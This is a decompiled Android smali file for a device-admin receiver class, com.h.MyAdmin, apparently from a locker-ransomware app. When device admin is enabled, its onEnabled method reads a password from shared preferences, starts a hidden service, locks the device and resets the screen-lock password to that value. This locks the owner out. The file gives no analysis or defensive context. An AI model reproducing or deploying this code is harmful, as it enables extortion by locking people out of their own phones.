.class public Lcom/h/MyAdmin;
.super Landroid/app/admin/DeviceAdminReceiver;
.source "MyAdmin.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 56
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onEnabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 19
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Landroid/content/Intent;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 25
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object/from16 v2, p2

    move-object v11, v1

    :try_start_0
    invoke-virtual {v11}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v11

    const v12, 0x7f060002

    invoke-virtual {v11, v12}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v11

    move-object v3, v11

    .line 26
    new-instance v11, Ljava/io/InputStreamReader;

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    move-object v13, v3

    const-string v14, "UTF-8"

    invoke-direct {v12, v13, v14}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    move-object v4, v11

    .line 27
    new-instance v11, Ljava/io/BufferedReader;

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    move-object v13, v4

    invoke-direct {v12, v13}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v5, v11

    .line 28
    const-string v11, ""

    move-object v6, v11

    .line 29
    :goto_0
    move-object v11, v5

    invoke-virtual {v11}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v11

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    move-object v6, v12

    if-nez v11, :cond_0

    .line 46
    :goto_1
    return-void

    .line 30
    :cond_0
    const-string v11, "info"

    move-object v12, v6

    invoke-static {v11, v12}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    move-result v11

    .line 31
    move-object v11, v1

    const-string v12, "password"

    const/4 v13, 0x0

    invoke-virtual {v11, v12, v13}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v11

    const-string v12, "password"

    move-object v13, v6

    invoke-interface {v11, v12, v13}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    move-object v7, v11

    .line 35
    new-instance v11, Landroid/content/Intent;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    move-object v13, v1

    :try_start_1
    const-string v14, "com.h.s"

    invoke-static {v14}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v14

    :try_start_2
    invoke-direct {v12, v13, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v8, v11

    .line 36
    move-object v11, v8

    const/high16 v12, 0x10000000

    invoke-virtual {v11, v12}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    move-result-object v11

    .line 37
    move-object v11, v1

    move-object v12, v8

    invoke-virtual {v11, v12}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v11

    .line 38
    move-object v11, v0

    move-object v12, v1

    invoke-virtual {v11, v12}, Lcom/h/MyAdmin;->getManager(Landroid/content/Context;)Landroid/app/admin/DevicePolicyManager;

    move-result-object v11

    invoke-virtual {v11}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    .line 39
    move-object v11, v0

    move-object v12, v1

    invoke-virtual {v11, v12}, Lcom/h/MyAdmin;->getManager(Landroid/content/Context;)Landroid/app/admin/DevicePolicyManager;

    move-result-object v11

    move-object v12, v7

    const/4 v13, 0x0

    invoke-virtual {v11, v12, v13}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z

    move-result v11

    .line 40
    move-object v11, v0

    move-object v12, v1

    move-object v13, v2

    invoke-super {v11, v12, v13}, Landroid/app/admin/DeviceAdminReceiver;->onEnabled(Landroid/content/Context;Landroid/content/Intent;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    .line 29
    :catch_0
    move-exception v11

    move-object v3, v11

    .line 46
    move-object v11, v3

    invoke-virtual {v11}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 35
    :catch_1
    move-exception v11

    move-object v9, v11

    :try_start_3
    new-instance v11, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    move-object v13, v9

    invoke-virtual {v13}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-direct {v12, v13}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v11
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Landroid/content/Intent;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 53
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    const-string v4, "------"

    const-string v5, "onReceive-----"

    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    .line 55
    move-object v4, v0

    move-object v5, v1

    move-object v6, v2

    invoke-super {v4, v5, v6}, Landroid/app/admin/DeviceAdminReceiver;->onReceive(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method
